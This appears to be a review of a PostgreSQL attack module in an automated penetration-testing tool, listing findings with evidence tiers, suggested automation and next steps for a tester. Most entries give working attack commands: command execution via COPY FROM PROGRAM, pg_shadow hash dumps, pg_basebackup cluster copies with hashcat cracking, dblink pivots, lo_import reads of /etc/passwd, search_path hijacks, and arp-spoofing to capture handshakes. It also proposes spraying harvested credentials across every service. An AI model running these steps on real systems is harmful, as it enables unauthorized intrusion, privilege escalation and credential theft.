summary: Highly mature module (1211 LOC). Speaks v3 protocol with trust/cleartext/md5/SCRAM-SHA-256 (including channel-binding SASLFinal verify), separate SSLRequest probe (TLS-offered), separate replication startup probe (pg_hba `host replication`), pg_shadow hash dump, PL extension inventory, dblink/postgres_fdw pivot detection, pg_largeobject legacy file-read primitive detection, PUBLIC-schema CREATE + SECURITY DEFINER-to-PUBLIC audits, foreign-server user-mapping cred harvest, redacted datamine, opt-in benign RCE proof via COPY FROM PROGRAM. Biggest gap: opt-in flag (`prove=True`) required for the RCE proof — default output stays at 'capability' T1 even when confirmable; no COPY-TO writing a canary path (INTO DUMPFILE-equivalent).

findings.tier_evidence: AuthenticationOk (code=0) observed on v3 startup with no password — server-proven trust; loot() then SELECTs pg_shadow etc., adding real data pulled.
findings.promotion_notes: Default-enable prove_rce (benign `id`) when trust+superuser is detected — the flag exists but is opt-in; that keeps T3 attainable without operator intervention.
findings.tester_next_step: psql 'host=<ip> port=<port> user=postgres'; \du; SELECT usename,passwd FROM pg_shadow; then CREATE TEMP TABLE r(o text); COPY r FROM PROGRAM 'id'; TABLE r.

findings.tier_evidence: weak_password_sweep authenticates via _do_auth (real SCRAM/md5 exchange) — landed default cred is proven, not guessed.
findings.promotion_notes: On weak-default hit, auto-invoke prove_rce (default `id`) when loot.can_rce — carries default-cred straight to captured host output.
findings.tester_next_step: psql 'host=<ip> port=<port> user=postgres password=postgres'; if superuser, COPY r FROM PROGRAM 'id' — command executes as postgres OS user.

findings.tier_evidence: Real credential authenticated via _do_auth; loot() then queries live pg_shadow / pg_extension / dblink surface.
findings.promotion_notes: Wire prove_rce for credentialed superuser path when analyze(prove=True); currently gated same as trust.
findings.tester_next_step:
psql 'host= port= user= password=

'; SELECT current_setting('is_superuser'); if on -> COPY FROM PROGRAM 'id'.

findings.title_pattern: PostgreSQL replication protocol accepts trust (pg_basebackup RCE-adjacent)
findings.tier_evidence: Separate probe_replication sends startup with replication=true and observes AuthenticationOk with no password — proof of the second (rarely-hardened) pg_hba trust surface.
findings.promotion_notes: Invoke pg_basebackup -X none -P into a scratch dir, then extract pg_shadow from the base backup and add hashes to loot — turns replication trust into an actual dump.
findings.tester_next_step: pg_basebackup -h <ip> -p <port> -U postgres -D /tmp/dump -X none -P; then extract global/pg_authid, crack hashes offline (hashcat -m 5433/28600).

findings.tier_evidence: SELECT rolname FROM pg_roles WHERE rolreplication — inventory of privileged accounts; does not test their passwords.
findings.promotion_notes: For each replication role, run weak_password_sweep with role-name as user (not just 'postgres') — if any hits, immediately promote to pg_replication_trust-tier proof.
findings.tester_next_step: For each rep-role: pg_basebackup -h <ip> -p <port> -U <role> -D /tmp/copy -X none — if it authenticates, full-cluster dump possible.

findings.title_pattern: PostgreSQL <lead> RCE (<src> superuser -> COPY FROM PROGRAM)
findings.tier_evidence: T1 by default (capability from is_superuser/pg_execute_server_program membership); T2 when analyze(prove=True) actually runs prove_rce which executes `id` via CREATE TEMP TABLE + COPY FROM PROGRAM and captures stdout attached to the finding.
findings.promotion_notes: Default `prove=True` when the tester ROE allows benign proof, and additionally chain into whoami+uname+ip a -> feed hostname into known_hosts. Higher fidelity T3 requires dropping a beacon which is explicitly out of recce scope.
findings.tester_next_step: psql 'host=<ip> user=<role>' -c "CREATE TEMP TABLE r(o text); COPY r FROM PROGRAM 'id'; TABLE r;"; expand to full whoami / hostname / uname -a; SeImpersonate-equivalent Linux path is capsh --print + suid hunt.

findings.title_pattern: PostgreSQL sensitive data exposed (PII / secrets / credentials)
findings.tier_evidence: datamine() actually SELECTs matched sensitive columns from information_schema.columns and returns redacted samples + regex-harvested connection strings feeding the looted[] Credential list.
findings.promotion_notes: The harvested connection strings are already stored — wire them into cross-service spray (postgres/mysql/mongodb/http) via known_creds so one DB's embedded secrets attack every discovered service automatically.
findings.tester_next_step: psql -c 'SELECT * FROM <schema>.<table> LIMIT 20'; reuse harvested URIs against every discovered service via nxc/proxychains + mssql/mongo/redis clients.

findings.tier_evidence: Live pg_extension + pg_available_extensions + pg_foreign_server query — deterministic evidence primitive is installed AND (with FDW) that foreign servers are configured pointing at internal DB hosts.
findings.promotion_notes: Auto-invoke dblink_connect against each foreign_server host and SELECT SYSTEM_USER / pg_shadow through it — proves the pivot works, dumps the remote hashes in one hop.
findings.tester_next_step: psql -c "SELECT dblink_connect('h','host=<internal-db> user=postgres dbname=postgres'); SELECT * FROM dblink('h','SELECT usename,passwd FROM pg_shadow') AS t(u text,p text);"

findings.title_pattern: PostgreSQL legacy file read via pg_largeobject / lo_import()
findings.tier_evidence: has_table_privilege(current_user,'pg_largeobject','SELECT') AND has_function_privilege(...,'lo_import(text)','EXECUTE') — direct ACL check, deterministic capability.
findings.promotion_notes: Actually SELECT lo_import('/etc/hosts') then loread the resulting oid and return first 64 bytes as proof, mirroring the mssql OPENROWSET pattern.
findings.tester_next_step: psql -c "SELECT lo_import('/etc/passwd') AS oid;" then loread the returned oid; grep for TLS keys / recovery.conf / pgpass on the DB host filesystem.

findings.title_pattern: PostgreSQL: PUBLIC schema is CREATE-able by any role
findings.promotion_notes: CREATE FUNCTION public.<canary>() RETURNS text AS $$ SELECT current_user $$ LANGUAGE sql; call from a fresh role and prove search_path resolution — reversible T2.
findings.tester_next_step: psql -c 'CREATE FUNCTION public.now() RETURNS text AS $$ SELECT current_user $$ LANGUAGE sql;' — any SECURITY DEFINER caller of now() without SET search_path resolves your version first.

findings.title_pattern: PostgreSQL: SECURITY DEFINER functions callable by PUBLIC
findings.tier_evidence: Live pg_proc + pg_namespace join filtered on prosecdef AND has_function_privilege('public',...,'EXECUTE') — deterministic capability + function owner surfaced.
findings.promotion_notes: For each listed function, inspect prosrc for missing SET search_path and (per public_create) attempt a controlled search_path hijack against a canary function to prove escalation to the definer's identity.
findings.tester_next_step: psql -c '\df+ <schema>.<function>' — inspect body for lack of SET search_path and vulnerable dynamic SQL; if owner is superuser, call it and see whose context runs.

findings.tier_evidence: probe_ssl sent the 8-byte SSLRequest and observed 'N' (or non-'S') — server-proven refusal per §55.2.10.
findings.promotion_notes: Verification requires an on-path sniff — out of scope for recce automation.
findings.tester_next_step: printf '\x00\x00\x00\x08\x04\xd2\x16\x2f' | nc <ip> <port> | head -c 1; if 'N' — arp-spoof + tcpdump the SCRAM handshake and offline-crack (hashcat -m 28600).

findings.tier_evidence: Banner-driven ver <= (11,4) — not a probe result. Note pg_rce covers the actual capability at T1/T2.
findings.promotion_notes: Fold in with pg_rce — when the primitive is already emitted as confirmed, the CVE flag is redundant / can be attached as related_cve to pg_rce.
findings.tester_next_step: Same as pg_rce: CREATE TEMP TABLE r(o text); COPY r FROM PROGRAM 'id'; TABLE r — see PostgreSQL 11.4 CHANGELOG.

findings.promotion_notes: Would require ownership of a table and autovacuum-triggered evaluation — probe complexity high; keep banner-driven with advisory reference.
findings.tester_next_step: Consult PostgreSQL advisory; on non-superuser-owned tables, plant an index expression that fires under REINDEX/CLUSTER to run as superuser.

findings.promotion_notes: Memory-write PoCs are destructive; leave banner-tier.
findings.tester_next_step: Do NOT run PoC — advise upgrade per CVE-2023-5869 fix.
